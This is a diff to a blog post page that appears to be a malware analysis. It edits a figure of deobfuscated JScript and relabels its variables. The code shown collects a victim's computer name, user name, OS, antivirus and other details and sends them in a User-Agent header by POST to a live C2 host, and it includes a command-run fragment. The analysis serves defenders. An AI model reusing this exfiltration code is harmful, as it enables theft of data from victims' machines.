@@ -104,7 +104,7 @@
     
     
     "mainEntityOfPage": "true",
-    "wordCount": "3376"
+    "wordCount": "3436"
   }]
   </script>
 
@@ -496,7 +496,7 @@
 <div class="flex flex-row flex-wrap items-center">
   
   
-  <time datetime="2022-11-29 00:00:00 &#43;0000 UTC">November 29, 2022</time><span class="px-2 text-primary-500">&middot;</span><span>3376 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">16 mins</span><span class="px-2 text-primary-500">&middot;</span>
+  <time datetime="2022-11-29 00:00:00 &#43;0000 UTC">November 29, 2022</time><span class="px-2 text-primary-500">&middot;</span><span>3436 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">17 mins</span><span class="px-2 text-primary-500">&middot;</span>
 
 
   
@@ -891,27 +891,28 @@ WScript.Quit(1);
 </span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">fi</span>.<span style="color:#a6e22e">Close</span>();
 </span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">sh</span>.<span style="color:#a6e22e">run</span>(<span style="color:#a6e22e">s2</span>);
 </span></span><span style="display:flex;"><span>		}
-</span></span></code></pre></div><p><em>Figure 9: Deobfuscated C2 commands</em></p>
+</span></span></code></pre></div><p><em>Figure 9: Partially Deobfuscated C2 commands</em></p>
+<p>This section of the code required more work. I needed to make additional adjustments to the parameters here to determine the functionality of each command that could be sent to the victim machine.</p>
 <p>Moving down, I arrived at the C2 domain that was previously located through the base64 decoding exercise. Here, we can see all of the additional informaiton that is sent via the post requests to the C2. Key points:</p>
 <ul>
 <li>C2 domain has the <code>/vre</code> directory appended to it as per Figure 9</li>
 <li>We can determine the syntax of the data sent to the C2 from the infromation provided below</li>
 </ul>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">Pt</span>(<span style="color:#a6e22e">C</span>, <span style="color:#a6e22e">A</span>) {
-</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">X</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Cr</span>(<span style="color:#ae81ff">3</span>);
-</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">X</span>.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#39;POST&#39;</span>, <span style="color:#e6db74">&#39;http://javaautorun.duia.ro:5465/&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">path</span>, <span style="color:#66d9ef">false</span>);
-</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">X</span>.<span style="color:#a6e22e">SetRequestHeader</span>(<span style="color:#e6db74">&#39;User-Agent:&#39;</span>, <span style="color:#a6e22e">nf</span>());
-</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">X</span>.<span style="color:#a6e22e">send</span>(<span style="color:#a6e22e">A</span>);
-</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">X</span>.<span style="color:#a6e22e">responsetext</span>;
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">C2_Domain</span>(<span style="color:#a6e22e">C</span>, <span style="color:#a6e22e">A</span>) { <span style="color:#75715e">// Domain to send victim information
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">C2_Request</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Microsoft.XMLHTTP&#34;</span>;
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">C2_Request</span>.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#39;POST&#39;</span>, <span style="color:#e6db74">&#39;http://javaautorun.duia.ro:5465/&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">path</span>, <span style="color:#66d9ef">false</span>);
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">C2_Request</span>.<span style="color:#a6e22e">SetRequestHeader</span>(<span style="color:#e6db74">&#39;User-Agent:&#39;</span>, <span style="color:#a6e22e">Info_Exfil</span>());
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">C2_Request</span>.<span style="color:#a6e22e">send</span>(<span style="color:#a6e22e">A</span>);
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">C2_Request</span>.<span style="color:#a6e22e">responsetext</span>;
 </span></span><span style="display:flex;"><span>}
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">nf</span>() {
-</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">victim_info</span>, <span style="color:#a6e22e">NT</span>, <span style="color:#a6e22e">i</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">Info_Exfil</span>() { <span style="color:#75715e">// Check to see whether vbc.exe exists on disk
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">victim_info</span>, <span style="color:#a6e22e">VBS_Exists</span>, <span style="color:#a6e22e">i</span>;
 </span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">fs</span>.<span style="color:#a6e22e">fileexists</span>(<span style="color:#a6e22e">Ex</span>(<span style="color:#e6db74">&#39;Windir&#39;</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;\\Microsoft.NET\\Framework\\v2.0.50727\\vbc.exe&#39;</span>)) {
-</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">NT</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;YES&#39;</span>;
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">VBS_Exists</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;YES&#39;</span>;
 </span></span><span style="display:flex;"><span>	} <span style="color:#66d9ef">else</span> {
-</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">NT</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;NO&#39;</span>;
-</span></span><span style="display:flex;"><span>	}
-</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">victim_info</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">campaign</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">blackslash</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">Ex</span>(<span style="color:#e6db74">&#39;COMPUTERNAME&#39;</span>) <span style="color:#f92672">+</span> <span style="color:#a6e22e">blackslash</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">Ex</span>(<span style="color:#e6db74">&#39;USERNAME&#39;</span>) <span style="color:#f92672">+</span> <span style="color:#a6e22e">blackslash</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">Ob</span>(<span style="color:#ae81ff">2</span>) <span style="color:#f92672">+</span> <span style="color:#a6e22e">blackslash</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">Ob</span>(<span style="color:#ae81ff">4</span>) <span style="color:#f92672">+</span> <span style="color:#a6e22e">blackslash</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">blackslash</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">NT</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">blackslash</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">reg_key_exits</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">blackslash</span>;
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">VBS_Exists</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;NO&#39;</span>;
+</span></span><span style="display:flex;"><span>	}       <span style="color:#75715e">// Collect and post the following victim information to C2 address
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">victim_info</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">campaign</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">blackslash</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">Ex</span>(<span style="color:#e6db74">&#39;COMPUTER_NAME&#39;</span>) <span style="color:#f92672">+</span> <span style="color:#a6e22e">blackslash</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">Ex</span>(<span style="color:#e6db74">&#39;USER_NAME&#39;</span>) <span style="color:#f92672">+</span> <span style="color:#a6e22e">blackslash</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">Sys_Info</span>(<span style="color:#a6e22e">GET_OS</span>) <span style="color:#f92672">+</span> <span style="color:#a6e22e">blackslash</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">Sys_Info</span>(<span style="color:#a6e22e">GET_AV</span>) <span style="color:#f92672">+</span> <span style="color:#a6e22e">blackslash</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">blackslash</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">VBS_Exists</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">blackslash</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">reg_key_exists</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">blackslash</span>;
 </span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">victim_info</span>;
 </span></span></code></pre></div><p><em>Figure 10: C2 Domain and POST data syntax</em></p>
 <p>The User-Agent string is used to supply the C2 domain with information recovered from the victim machine</p>
